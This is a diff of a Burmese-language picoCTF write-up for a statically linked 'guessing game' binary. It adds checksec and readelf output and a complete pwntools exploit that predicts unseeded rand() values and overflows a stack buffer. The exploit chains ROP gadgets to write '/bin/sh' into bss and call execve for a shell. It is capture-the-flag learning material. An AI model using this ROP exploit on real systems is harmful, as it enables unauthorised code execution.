@@ -245,11 +245,25 @@ picoCTF{Power_t0_man!pul4t3_3nv_3f693329}ctf-player@pico-chall$ Connection to sa
 explain this, └─$ file vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=670139b05b438fbd512de3e3a3bf2715f295cbbc, not stripped
 ```
 
-	 ဒီမှာက  statically linked ဖြစ်နေတယ် ဆိုလိုတာက program ထဲမှာ လိုအပ်တဲ့ libraries တွေအားလုံးကို program ထဲမှာပဲထည့်သွင်းထားတာပါ။ Dynamic linking မဟုတ်တဲ့အတွက် အခြား system libraries တွေမလိုအပ်ဘူး။ 
+```c
+pwndbg> checksec
+File:     /home/Jackfruit/cate/learn/binary/stack/picoCTF/guessingGame1/vuln
+Arch:     amd64
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+Stripped:   No
+
+```
+
+
+	 ဒီမှာက  statically linked ဖြစ်နေတယ် ဆိုလိုတာက program ထဲမှာ လိုအပ်တဲ့ libraries တွေအားလုံးကို program ထဲမှာပဲထည့်သွင်းထားတာပါ။ Dynamic linking မဟုတ်တဲ့အတွက် အခြား system libraries တွေမလိုအပ်ဘူး
 	 ဆိုတော့  static ဖြစ်လို ROP gadget တွေရှာရလွယ်မယ် 
 	 no stripped ဖြစ်လို့ function name တွေမြင်ရမယ်
 
-	ဒီမှာ vuln တစ်ခုတွေ့တယ် random တောင်းပြီး user input နဲ့စစ်တယ် ဒါမဲ့ random functionက ဘာလုပ်လဲဆို တစ်ခါလာတိုင်း random လုပ်မယ့် no တွေကတူနေမယ် list တစ်ကို random funciton ခေါ်တိုင်း index အလိုက် output ထုတ်သလိုမျိူး ဆိုတော့ ငါတို့ ခန့်မှန်းလို့ရတယ်  random function ကို seed ပေးလိုက်ရင်တော့ ငါတို့ခန့်မှန်းလို့မရတော့ဘူး seed ဆိုတာက အချိန်အလိုက်ပြောင်းလဲပေးတာကို ပြောတာဖြစ်တယ်
+	ဒီမှာ vuln တစ်ခုတွေ့တယ် random တောင်းပြီး user input နဲ့စစ်တယ် ဒါမဲ့ random functionက ဘာလုပ်လဲဆို တစ်ခါလာတိုင်း random လုပ်မယ့် no တွေကတူနေမယ် list တစ်ကို random funciton ခေါ်တိုင်း index အလိုက် output ထုတ်သလိုမျိူး ဆိုတော့ ငါတို့ ခန့်မှန်းလို့ရတယ်  
+	random function ကို seed ပေးလိုက်ရင်တော့ ငါတို့ခန့်မှန်းလို့မရတော့ဘူး seed ဆိုတာက အချိန်အလိုက်ပြောင်းလဲပေးတာကို ပြောတာဖြစ်တယ်
 
 ``` c
 //seedဘယ်လိုသုံးတာလဲဆိုတာ ဥပမာ
@@ -285,7 +299,81 @@ void win(void)
 ```
 
 	နောက်တစ်ချက်သိရမှာက ဒီကောင်က libc မလိုဘူး လိုအပ်တဲ့ funcitonတွေပါတဲ့ အတွက် CPU instruction ပေးမယ် syscall instruction ကလည်း binary ထဲပါလာမယ်
-	ဆိုတော့ buffer over flow read rop gadget သုံးမယ် လိုအပ်တဲ့ argument register တွေသုံးမယ် /bin/sh/0x00 ကို bss ထဲထည့် /bin/sh/0x00 string ဆိုတော့ null terminator ပါရမယ် ပြီးရင် main သုံးပြီး buffer over flow မယ် syscall rop gadget ကို သုံးပြီး exec function ကို createလုပ်မယ် argument တွေထည့်မယ် bss  address ပေးပြီး ဒီကောင် /bin/sh/0x00 ကို execv လုပ်စေမယ် shell ရမယ်
+	ဆိုတော့ buffer over flow read rop gadget သုံးမယ် လိုအပ်တဲ့ argument register တွေသုံးမယ် 
+	/bin/sh/0x00  ဆိုတဲ့ stringကို bss ထဲထည့်မယ်
+	 /bin/sh/0x00 string ဆိုတော့ null terminator ပါရမယ် 
+	 ပြီးရင် main သုံးပြီး buffer over flow မယ် syscall rop gadget ကို သုံးပြီး exec function ကို createလုပ်မယ်
+	argument တွေထည့်မယ် bss  address ပေးပြီး ဒီကောင် /bin/sh/0x00 ကို execv လုပ်စေမယ် shell ရမယ်
+
+
+	bss ကို commandline နဲ့ရှာလို့ရသလို python elfနဲ့လည်းရှာလို့ရ
+```c
+                                                                                                                                                             
+┌──(Jackfruit㉿kali)-[~/…/binary/stack/picoCTF/guessingGame1]
+└─$ readelf -S ./vuln | grep bss
+  [15] .tbss             NOBITS           00000000006b7140  000b7140
+  [26] .bss              NOBITS           00000000006bc3a0  000bc398
+
+```
+
+
+```python
+from pwn import *
+
+e = ELF("./vuln")
+p = process(e.path)
+#p = remote("shape-facility.picoctf.net", 51698)
+read = e.symbols['read']
+syscall = p64(0x000000000040138c)
+randomm = [84,87]
+
+main = p64(0x0000000000400c9c)
+pop_rax = p64(0x00000000004005af)
+pop_rdi = p64(0x00000000004006a6)
+pop_rsi = p64(0x0000000000410b93)
+pop_rdx = p64(0x0000000000410602)
+bss = p64(e.bss())
+
+payload = b'\x90'*120
+payload += pop_rdi
+payload += p64(0)
+payload += pop_rsi
+payload += bss
+payload += pop_rdx
+payload += p64(9)
+payload += p64(read)
+payload += main
+
+
+
+p.recvline(b"What number would you like to guess?")
+p.sendline(str(randomm[0]).encode())
+p.recvuntil(b"Name? ")
+p.sendline(payload)
+p.sendline(b"/bin/sh\x00")
+input("Just Enter to exploit")
+p.recvline(b"What number would you like to guess?")
+
+payload = b'\x90'*120
+payload += pop_rax
+payload += p64(0x3b)
+payload += pop_rdi
+payload += bss
+payload += pop_rsi
+payload += p64(0)
+payload += pop_rdx
+payload += p64(0)
+payload += syscall
+
+
+p.recvline(b"What number would you like to guess?")
+p.sendline(str(randomm[1]).encode())
+p.recvuntil(b"Name? ")
+p.sendline(payload)
+p.interactive()
+```
+
+
 
 ---
 
